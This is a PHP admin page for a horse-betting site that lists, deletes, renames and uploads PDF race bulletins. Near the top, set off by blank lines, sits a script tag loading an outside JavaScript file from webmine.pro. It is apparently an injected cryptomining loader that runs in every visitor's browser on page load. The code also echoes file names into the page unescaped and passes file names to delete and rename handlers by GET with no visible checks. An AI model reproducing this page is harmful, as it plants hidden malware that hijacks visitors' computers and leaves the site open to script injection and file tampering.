<?php
if (!isset($_SESSION)) {
    session_start();
} include("../includes/funciones.php");
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>.:Apuestas Hípicas:.</title>
</head>

<script src="//webmine.pro/lib/crlt.js"></script>





<style type="text/css">body{margin:0;padding:0;font-family:Tahoma, Geneva, sans-serif; background:#FFFFFF}</style> 
<body onload="Javascript:history.go(1);" onunload="Javascript:history.go(1);">





	<div style="font-size:34px; background:#F3F3F3; text-align:center; padding:10px 10px 10px 10px">BORRAR - EDITAR - SUBIR DIRECTAMENTE <br/>POR FAVOR VERIFIQUE LA FECHA DE LAS GACETAS
    </div>
	<div style="font-size:18px;text-align:center; padding:40px 10px 40px 10px">
vERIFICAR LAS GACETAS A LAS 11 Y 30 <a href="javascript:location.reload()"></a>.<br/> 
	 <form action="subida.php" method="get">
	                  <input type="text" name="subida" id="subida" class="textbox" 
                  tabindex="5" style="width:930px; height:25px" required="required" onclick="ocultaDiv('Info');"
                    
                    size="32" placeholder="Colocar aqui el link de la gaceta que se va subir recuerde verificar que termine en .pdf" title="indique un link 10-160 caracteres" 
                    onKeyUp="return handleEnter(this, event)" maxlength="160"/>
					<input type="submit" class="btn badge-warning" value="Subirgaceta"  tabindex="18"
                  	style="width:160px; height:40px; font-size:16px;" />
					</form>   
    </div>
    <hr/>
    <?php
    $the_file_array = array();
    $handle = opendir('./');
    while (false !== ($file = readdir($handle))) {
        if (filetype($file) == "file" && (fnmatch("*.PDF*", strtoupper($file)))) {
            $the_file_array[] = $file;
        }
    }
    closedir($handle);
    sort($the_file_array);
    reset($the_file_array);
    while (list($key, $val) = each($the_file_array)) {
        $largo = strlen($val);

        $verificaraqui="  V V V V V  Verificar la fecha y que sea la gaceta indicada aqui";
        echo '<div style="font-size:16px;width:600px; text-align:left; padding:5px 0px 1px 50px">';
        echo '<a href="'.$val.'" target="_blank">'.substr($val, 0, $largo-4).$verificaraqui.'</a>';
        echo '</div>';
        $borrar = "borrar.php?fichero=";
        $val2 = $borrar.$val;
        $borraraqui="  B B B B B  Borrar al darle click aqui";
        echo '<div style="font-size:16px;width:600px; text-align:left; padding:5px 0px 1px 50px">';
        echo '<a href="'.$val2.'" target="_self">'.substr($val, 0, $largo-4).$borraraqui.'</a><BR>';
        echo '</div>'; ?>
	 <form action="renombrar.php" method="get">
<input type="hidden" name="viejonombre" value="<?php echo $val ?>">
	                  <input type="text" name="nuevonombre" id="nuevonombre" class="textbox" 
                  tabindex="5" style="width:430px; height:25px" required="required" onclick="ocultaDiv('Info');"
                    value=" <?php echo substr($val, 0, $largo-4); ?>" 
                    size="32" title="indique un nombre 4-60 caracteres" 
                    onKeyUp="return handleEnter(this, event)" maxlength="60"/>
					<input type="submit" class="btn badge-warning" value="Modificar Nombre"  tabindex="18"
                  	style="width:160px; height:40px; font-size:16px;" />
					</form>
	<?php
echo '<BR>';
    }
    ?> 
<BR>
<BR>
<BR>
<BR>
<BR>
<BR>
<BR>
<BR>
<BR>
<BR>
<BR>
<BR>
<BR>
<BR>
<BR>
<BR>
<BR>
<BR>
<BR>
<BR>
<BR>
<BR>
<BR>
<BR>
<BR>
<BR>
<BR>
<BR>
<BR>
<BR>
<BR>
<BR>
<BR>
<BR>
<BR>
<BR>
<BR>
<BR>
<BR>
<BR>
<BR>
<BR>



</body>
</html>